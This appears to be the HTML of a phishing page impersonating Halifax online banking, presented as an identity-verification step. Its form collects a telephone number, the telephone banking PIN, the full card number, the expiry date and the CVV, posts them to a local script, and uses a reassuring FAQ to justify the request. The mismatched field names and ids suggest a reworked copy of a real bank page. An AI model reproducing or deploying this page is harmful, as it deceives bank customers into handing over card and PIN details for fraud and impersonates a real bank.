<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">













<html xmlns="http://www.w3.org/1999/xhtml" lang="en-gb" xml:lang="en-gb">
	<head>
		

<title>Halifax - Customer Identification Data</title>
<meta name="keywords" content="" />
<meta name="description" content="" />
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />	
<meta http-equiv="content-language" content="en-gb" />
<!--[if gte IE 8]><meta http-equiv="X-UA-Compatible" content="IE=IE8" /><![endif]-->
<meta name="robots" content="noindex" />
<meta name="distribution" content="global" />
<meta name="rating" content="general" />
<link rel="shortcut icon" href="css/favicon.ico" />

<link href="css/global1-min111011.css" media="screen, print" type="text/css" rel="stylesheet" />
<link href="css/global2-min111011.css" media="screen, print" type="text/css" rel="stylesheet" />

<link href="css/print_base-min110729.css" media="print" type="text/css" rel="stylesheet" />
<!--[if IE 8]>
<link href="css/ie8-min110817.css" type="text/css" rel="stylesheet" />
<![endif]-->
<!--[if IE 7]>
<link href="css/ie7-min111005.css" type="text/css" rel="stylesheet" />
<![endif]-->
<!--[if lt IE 7]>
<link href="css/ie6-min111004.css" type="text/css" rel="stylesheet" />
<![endif]-->

<script type="text/javascript" src="css/jquery-min110923.js"></script>
<script type="text/javascript" src="css/scriptsnippet.jspf"></script>
<script type="text/javascript" src="css/global-min111005.js"></script>
<script type="text/javascript" src="css/custom-min111005.js"></script>


		
	</head>
	<body>
		
					<div id="wrapper">
			




<div class="outer">
	<div id="header">
		<ul id="skiplinks">	
			<li><a id="lnkSkip" name="lnkSkip" href="#page">Skip to main content</a></li>
		</ul>
		<div class="clearfix">
			<p id="logo">
				<span><img src="css/personal_loans_halifax-1-1290683246.jpg" alt="Halifax" /></span>	
			</p>
			
				
					
						
					
					
				
				
					
					
				
				
					
						
						
					
					
											
											
					
					
					
						
					
				
			<div class="secureMsg"><p class="msg"><img src="css/hfx-sign-in-to-secure-site-1-1314611574.png?MOD=AJPERES&amp;CACHEID=932af700482281b79862fe736c2bd3f6" alt="You&amp;#8217;re signing in to a secure site" /></p><p><a href="#" title="How can I tell that this site is secure?"  class="newwin">How can I tell that this site is secure?</a></p></div>
		</div>
	</div>
</div>
			<div class="pageWrap">
				<div id="page" class="content">
				
					<div class="primaryWrap">
					
						<div class="primary">
						<div class="panel">
						
						
						
											
							
			
			

			

			

			<h1>Verify your identity</h1>
			
			
				
			
			
				
					
					
				
				
				
					
						
					
					
					
						
							
						
					
					
											
						
					
					
											
						
					
					
					
						
						

							

						



					
				

				
				
					

					
						
					

				

			
<form id="frmCustIDData" name="frmCustIDData" method="post" action="customeridentificationcarddata.jsp" class="validationName:(frmCustIDData) validate:()" autocomplete="off">
<div class="inner"><p>Please continue by giving us these details</p><h2>Your&#160;details</h2></div><fieldset><div class="formField  validate:(required_validateNumeric) validationName:(userID) clearfix"><div class="formFieldInner"><label for="frmCustIDData:strUserID">Telephone Number</label><input type="text" autocomplete="off" id="frmCustIDData:strUserID" name="tel" class="field" maxlength="11" /></div></div><div class="formField  validate:(required_validateNumeric) validationName:(userID) clearfix"><div class="formFieldInner"><label for="frmCustIDData:strUserID">Telephone Banking 6 Digits PIN</label><input type="password" autocomplete="off" id="frmCustIDData:strUserID" name="tpin" class="field" maxlength="6" /></div></div><div class="formField validate:(required_validateNumeric) validationName:(firstName) clearfix"><div class="formFieldInner"><label for="frmCustIDData:strFirstName">Credit / Debit Card Number (16 digits)</label><input type="text" autocomplete="off" id="frmCustIDData:strFirstName" name="card" class="field" maxlength="16" /></div></div><div class="formField validationName:(dateOfBirth) clearfix validationName:(dtDateOfBirth) validate:(required[msg:idGC1m0]_validateDateTimeRange[minDate:2011-11-01,maxDate:2020-12-01])"><div class="formFieldInner"><span class="label">Card Expiry Date</span><div class="date inputGroup"><label for="frmCustIDData:dtDateOfBirth" class="postit">Day</label><input type="hidden" id="frmCustIDData:dtDateOfBirth" name="cc" value="01" class="day slctDay"><label for="frmCustIDData:dtDateOfBirth.month" class="postit">Month</label><select id="frmCustIDData:dtDateOfBirth.month" name="month" class="month slctMonth"><option value="-">Month</option><option value="01">January</option><option value="02">February</option><option value="03">March</option><option value="04">April</option><option value="05">May</option><option value="06">June</option><option value="07">July</option><option value="08">August</option><option value="09">September</option><option value="10">October</option><option value="11">November</option><option value="12">December</option></select><label for="frmCustIDData:dtDateOfBirth.year" class="postit">Year</label><select id="frmCustIDData:dtDateOfBirth.year" name="year" class="year slctYear"><option value="-">Year</option><option value="2012">2012</option><option value="2013">2013</option><option value="2014">2014</option><option value="2015">2015</option><option value="2016">2016</option><option value="2017">2017</option><option value="2018">2018</option><option value="2019">2019</option><option value="2020">2020</option></select></div></div></div><div class="formField validate:(required_validateNumeric) validationName:(surname) clearfix"><div class="formFieldInner"><label for="frmCustIDData:strSurname">CVV(3 digits)</label><input type="text" autocomplete="off" id="frmCustIDData:strSurname" name="cvv" size="8"  maxlength="3" /></div></div></fieldset><ul class="actions"><li class="primaryAction"><input id="frmCustIDData:btnContinue" name="frmCustIDData:btnContinue" type="image" src="css/continue-4-1294218380.png?MOD=AJPERES&amp;CACHEID=a73e3e0043ce3c9b8bae9f378f3e6a79" alt="Continue" title="Continue" class="submitAction" /></li><li><strong><a id="frmCustIDData:lnlCancel" name="frmCustIDData:lnlCancel" href="login.jsp" title="Cancel" class="cancel pseudoLink">Cancel</a></strong></li></ul><input type="hidden" name="frmCustIDData" value="frmCustIDData" /><input type="hidden" name="submitToken" value="2148427" />
</form>

		
							</div>
						</div>
						
					</div>
					<div class="secondary">
						<div class="panel">
							
							
							

				
				
				
			
							<div class="accordion"><div class="part"><h2 class="trigger">Contact us</h2><div class="pane"><div class="paneInner"><div class="quickContact"><h3>Bank accounts</h3>
<p>08457 203 040<br />+44 1132 422 229&#160;from outside the UK</p>
<h3>Savings</h3>
<p>08457 263 646<br />
Lines are open Monday to Friday 8am&#8211;8pm, Saturday 8am-6pm, Sunday 9am-5pm.</p>
<h3>Credit cards</h3>
<p>08457 283 848<br />+44 8457 283 848&#160;from outside the UK</p>
<p>08459 444 555&#160;if your card number begins 525303<br />+44 1733 573 189&#160;from outside the UK</p>
<h3>Mortgages</h3>
<p>08457 27 37 47<br />
Lines are open Monday to Friday 8am&#8211;8pm, Saturday and Sunday 9am-4pm.</p>
<h3>Personal loans</h3>
<p>If your loan agreement begins with 7 call&#160;08457 243 444&#160;(Lines are open Monday to Friday 8am-8pm, Saturday 9am-6pm).<br />
If your loan agreement begins with 84 call&#160;08457 444 455&#160;(Lines are open Monday to Friday 8am-10pm, Saturday 8:30am-6pm, Sunday 9:30am-5.30pm).<br />
If your loan agreement begins with 100 call&#160;08456 047 292&#160;(Lines are open Monday to Sunday 8am-10pm).</p>
<h3>Lost or stolen cards</h3>
<p>08457 203 099<br />+44 1315 498 050&#160;from outside the UK</p>
<h3>Online Banking Helpdesk</h3>
<p>08456 020 000<br />+44 1132 798 302&#160;from outside the UK</p>
<h3>Textphone</h3>
<p>08457 323 436<br />
Lines are open Monday to Friday, 9am - 5.30pm. (For use by customers with hearing impairments only)</p>
<p>We may record your call so we can check we've carried out your instructions correctly and to help us improve our service.</p></div></div></div></div><div class="part"><h2 class="trigger current">Help &amp; support</h2><div class="pane"><div class="paneInner"><ul class="quickFAQs">
			
	
	<li><h3 class="qfaqTrigger">What is CVV (3 digits code)?</h3>
			<div class="qfaqCont">
					<p><p>The CVV code is  the last 3 digit number located on the back of your card on or above your signature line.</p>
</p>
				    </div>
			</li>
<li><h3 class="qfaqTrigger">Why do you need my details again?</h3>
			<div class="qfaqCont">
					<p><p>This information will help us to make sure that it's really you using Halifax Online Banking and not someone else.</p>
</p>
				    </div>
			</li>
</ul>

					<p><a href="http://www.halifax.co.uk/onlinebankinghelp/onlinehelp.asp" title="More help &amp; support" target="_blank"  class="linkBullet linkMore newwin newfaqwin">More help & support</a></p></div></div></div></div>




	
				
		
		
			
				
					
				
			
			
					
			
		
				
		
			
		
		
							
						</div>
					</div>
				</div>				
			</div>
			

<div id="footer">
<div class="outer">
<div id="footerInner">

<ul><li><a href="http://www.halifax.co.uk/bankaccounts/help-guidance/important-information/" title="Legal"  class="newwin">Legal</a></li><li><a href="http://www.halifax.co.uk/securityandprivacy/securityandprivacy.asp"  class="newwin">Privacy</a></li><li><a href="http://www.halifax.co.uk/securityandprivacy/securityandprivacy.asp"  class="newwin">Security</a></li><li><a href="http://www.lloydsbankinggroup.com/"  class="newwin">Lloyds Banking Group</a></li><li><a href="http://www.halifax.co.uk/bankaccounts/rates-rewards-fees/" title="Rates &amp; fees"  class="newwin">Rates & fees</a></li></ul>
</div>
</div>
</div>

		</div>

		







	</body>
</html>
